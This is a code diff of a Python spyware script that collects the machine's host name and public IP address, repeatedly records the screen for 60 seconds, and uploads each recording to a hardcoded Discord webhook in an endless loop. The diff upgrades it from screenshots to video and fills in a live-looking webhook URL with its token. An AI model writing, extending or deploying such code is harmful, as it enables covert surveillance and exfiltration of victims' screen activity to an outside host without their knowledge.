@@ -3,10 +3,10 @@ import json
 import socket
 import requests
 import time as t
-import pyautogui as autogui
+import pyscreenrec
 
 # Setup
-WEBHOOK = 'Webhook_URL_Here'
+WEBHOOK = 'https://discord.com/api/webhooks/1377001596235550790/U35bN7Wpx81Qy-9s7qVubz9mGQQBzEyXCQ2vOHQD1CBP3eYRv0U-N53QdGYK5KKzu3HO'
 
 def get_device_name():
     return socket.gethostname()
@@ -16,31 +16,32 @@ def get_ip():
     ip = response.json()['ip']
     return ip
 
+
 def send_screenshot(computer, ip):
-    screenshot = autogui.screenshot()
-    screenshot.save('screen.png')
+    recorder = pyscreenrec.ScreenRecorder()
+    recorder.start_recording("recording.mp4", 30)
+    t.sleep(60)
+    recorder.stop_recording()
     embed = {
         "title": "Screen Captured",
         "description": f"**Device:** `{computer}`\n**IP Address:** `{ip}`",
         "color": 0x3498db,
-        "image": {
-            "url": "attachment://screen.png"
+        "video": {
+            "url": "attachment://recording.mp4"
         }
     }
     payload = {
         "embeds": [embed]
     }
-    with open('screen.png', 'rb') as f:
+    with open('recording.mp4', 'rb') as f:
         files = {
-            'file': ('screen.png', f, 'image/png'),
+            'file': ('recording.mp4', f, 'video/mp4'),
             'payload_json': (None, json.dumps(payload), 'application/json')
         }
         requests.post(WEBHOOK, files=files)
-    os.remove('screen.png')
 
 while True:
     device = get_device_name()
     IPv4 = get_ip()
-    for i in range(300):
+    for i in range(5):
         send_screenshot(device, IPv4)
-        t.sleep(30)
